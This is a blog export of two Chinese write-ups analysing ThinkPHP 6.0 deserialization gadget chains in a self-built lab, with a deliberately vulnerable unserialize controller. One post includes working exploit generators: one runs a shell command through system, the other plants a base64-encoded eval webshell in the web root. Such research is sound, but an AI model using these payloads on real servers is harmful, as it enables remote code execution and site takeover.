<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ThinkPHP6.0.*反序列化漏洞-2</title>
    <url>/2022/03/18/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/</url>
    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><p>详见前文</p>
<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>详见前文</p>
<h2 id="0x03-知识要点"><a href="#0x03-知识要点" class="headerlink" title="0x03-知识要点"></a>0x03-知识要点</h2><p>官方文档介绍 ThinkPHP 6.* 启动方式是在终端输入 <code>php think run</code>，启动之后会在终端滚动显示应用运行的情况。通过测试，当通过 <code>system</code> 函数在终端下执行如下形式，<code>system([],&quot;`whoami`&quot;)</code>，可正式执行 <code>whoami</code> 函数，这是由于 shell 中的优先级高，所以会先执行 &#96;&#96; 中的内容，再把执行结果拼接成一个新命令，但是实际上system函数是报错的，所以实际环境不一定会显示出执行后的报错信息。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286640471.png"></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286645101.png"></p>
<h2 id="0x04-构造POP"><a href="#0x04-构造POP" class="headerlink" title="0x04-构造POP"></a>0x04-构造POP</h2><h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;autosave= false</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>发现没有实现 <code>save()</code> 方法的代码，尝试查找继承了 AbstractCache 并且实现了 save 方法的继承类。找到如下：<code>/vendor/topthink/framework/src/think/filesystem/CacheStore.php</code> ，<code>save()</code> 方法实现如下：</p>
<p><strong>save()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进 <code>getForStorage()</code> ，发现 <code>cleanContents()</code> 方法，跟进 <code>cleanContents()</code> 方法，该代码大概意思就是从<code> $contents[$path]</code> 列表中提取键名与 <code>[&#39;path&#39;, &#39;dirname&#39;, ...]</code> 相同键值对，同时更新 <code>$contents[$path]</code> 的值。未发现可利用方法。<br>返回getForStorage()，接下来的代码是reture一个经过json_encode处理的数组。</p>
<p><strong>getForStorage()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>cleanContents()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line"><span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到 <code>save()</code> 方法，继续观察后续代码。发现 <code>$this-&gt;store</code> 可以控制，即我们调用任意类的 set 方法，或者触发任意不存在 save 方法类的 <code>__call</code> 魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br></pre></td></tr></table></figure>

<p>找到<code>/vendor/topthink/framework/src/think/cache/driver/File.php</code></p>
<h3 id="跟进-set-方法"><a href="#跟进-set-方法" class="headerlink" title="跟进 set 方法"></a>跟进 set 方法</h3><p><code>getExpireTime()</code> 方法为获取过期时间。<br><code>getCacheKey()</code> 方法为获取文件存储名字。</p>
<h3 id="跟进serialize-方法"><a href="#跟进serialize-方法" class="headerlink" title="跟进serialize()方法"></a>跟进serialize()方法</h3><p>发现可利用点，<code>$serialize($data)</code>。其中 <code>$serialize</code> 由 <code>$this-&gt;options[&#39;serialize&#39;][0]</code> 控制，<code>$this-&gt;options[&#39;serialize&#39;][0]</code> 可控。<code>$data</code> 的来源为 $<code>contents = $this-&gt;getForStorage() --&gt; set($this-&gt;key, $contents, $this-&gt;expire) --&gt; set($name, $value, $expire = null) --&gt; serialize($value) --&gt; $serialize($data)</code> ，即 <code>$data</code> 源于<code>$this-&gt;getForStorage()</code>。上面已经跟进过 <code>getForStorage()</code> 方法，<code>getForStorage()</code> 方法中的<code>$cleaned</code> 、<code>$this-&gt;complete</code> 均可控，所以返回结果即可以控制。</p>
<p><strong>serialize():</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] ?? <span class="string">&quot;serialize&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286677451.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;`whoami`&quot;</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span></span><br></pre></td></tr></table></figure>

<p>调用过程如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;\think\cache<span class="title class_">\Driver\File</span>::<span class="title function_ invoke__">set</span>()——&gt;<span class="title function_ invoke__">serialize</span>()--&gt;<span class="variable">$serialize</span>(<span class="variable">$data</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05-EXP"></a>0x05-EXP</h2><h3 id="EXP-1："><a href="#EXP-1：" class="headerlink" title="EXP_1："></a>EXP_1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=[<span class="string">&quot;`whoami`&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="EXP-2（文件写入操作，与上面大同小异，不做论述）："><a href="#EXP-2（文件写入操作，与上面大同小异，不做论述）：" class="headerlink" title="EXP_2（文件写入操作，与上面大同小异，不做论述）："></a>EXP_2（文件写入操作，与上面大同小异，不做论述）：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=<span class="string">&quot;aaaaPD9waHAgZXZhbCgkR0VUWyJjbWQiXSk7Pz4=&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=/var/www/html/thinkphp6.0-dev/public/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = [];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.dazhuanlan.com/naiyouhzu/topics/1541898">https://www.dazhuanlan.com/naiyouhzu/topics/1541898</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
        <tag>ThinkPHP</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP6.0.*反序列化漏洞-1</title>
    <url>/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><h3 id="官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="官方安装教程：https://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>官方安装教程：<a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h3><p>可能遇到的问题 composer 目录为空的情况，解决办法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. 切换到根目录、核心框架目录，更新。指令如下: </span></span><br><span class="line">composer update </span><br><span class="line"><span class="comment">#2. 更新composer自身，指令如下：</span></span><br><span class="line">composer seft-update</span><br></pre></td></tr></table></figure>

<h3 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h3><p>update 的时候提示：<code>Your requirements could not be resolved to an installable set of packages. </code>解决办法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#composer 可以设置忽略版本匹配</span></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>

<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>利用条件为存在 <code>unserialize()</code> 函数且参数可控。手动创造条件验证漏洞，在Index控制器中写入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);   <span class="comment">// 参数可控的unserialize函数</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-构造POP"><a href="#0x03-构造POP" class="headerlink" title="0x03-构造POP"></a>0x03-构造POP</h2><p>反序列化漏洞起点通常为  <code>__destruct()</code> 及 <code>__wake()</code> 两个魔术函数，因为它们就是 <code>unserialize</code> 的触发点。</p>
<h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>Model.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;lazySave = True</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;updateData()</code> 内部，需要进入 <code>$this-&gt;updateData()</code> 方法：</p>
<ol>
<li>在此之前则不能被 return ，所以 if 语句中的 <code>$this-&gt;isEmpty()</code> 必须等于 <code>false</code> 以及 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 必须等于 <code>true</code> 才能避免 return；</li>
<li><code>$this-&gt;exists</code> 必须为 <code>true</code>。</li>
</ol>
<p>跟进 <code>$this-&gt;isEmpty()</code>，要想 <code>$this-&gt;isEmpty() </code>等于 <code>false</code>，只需要 <code>$tish-&gt;data </code>不等于空。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>跟进 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code>，要想 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 等于 <code>ture</code>，只需要 <code>$this-&gt;withEvent</code> 等于 <em>空</em> 或 <code>false</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"> <span class="keyword">try</span> &#123;...&#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跟进-updateData-方法"><a href="#跟进-updateData-方法" class="headerlink" title="跟进 updateData() 方法"></a>跟进 updateData() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;checkAllowFields()</code> 内部，需要进入 <code>$this-&gt;checkAllowFields()</code> 方法，在此之前则不能被 return。</p>
<p>第一个 if 语句中，<code>$this-&gt;trigger(&#39;BeforeUpdate&#39;))</code> 需要为 true，上一步已经设置。</p>
<p>第二个 if 语句中，<code>$data</code> 需要为 true 或不为 <em>空</em> ，<code>$data</code> 来自 <code>$this-&gt;getChangedData()</code>，跟进 <code>$this-&gt;getChangedData()</code>，只需要将 <code>$this-&gt;force</code> 为 <code>true</code> 即可直接原封不动返回 <code>$this-&gt;$data</code> 的值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只读字段不允许更新</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跟进-checkAllowFields-方法"><a href="#跟进-checkAllowFields-方法" class="headerlink" title="跟进 checkAllowFields() 方法"></a>跟进 checkAllowFields() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;db()</code> 内部，需要进入 <code>$this-&gt;db()</code>，即 <code>$this-&gt;field</code> 需要为空，<code>$this-&gt;schema</code> 需要为空。<code>$this-&gt;field</code> 及 <code>$this-&gt;schema</code> 默认为空。</p>
<h3 id="跟进-db-方法"><a href="#跟进-db-方法" class="headerlink" title="跟进 db() 方法"></a>跟进 db() 方法</h3><p>已经可以看到字符拼接操作，当一个类对象被当做字符串处理的时候，将会触发该类对象的 <code>__toString()</code> 魔术方法。</p>
<p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用 <code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lazySave == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;data不为空</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withEvent == <span class="literal">false</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;exists == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>调用过程如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）——&gt;<span class="title function_ invoke__">toString</span>()</span><br></pre></td></tr></table></figure>

<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>结合 Thinkphp 5.x 的反序列化链，<code>__toString()</code> 部分，即可触发反序列化漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）</span><br><span class="line">——&gt;<span class="title function_ invoke__">__toString</span>()--&gt;<span class="title function_ invoke__">toJson</span>()--&gt;<span class="title function_ invoke__">toArray</span>()--&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)--&gt;<span class="title function_ invoke__">getValue</span>()--&gt;<span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)(最终利用点)</span><br></pre></td></tr></table></figure>

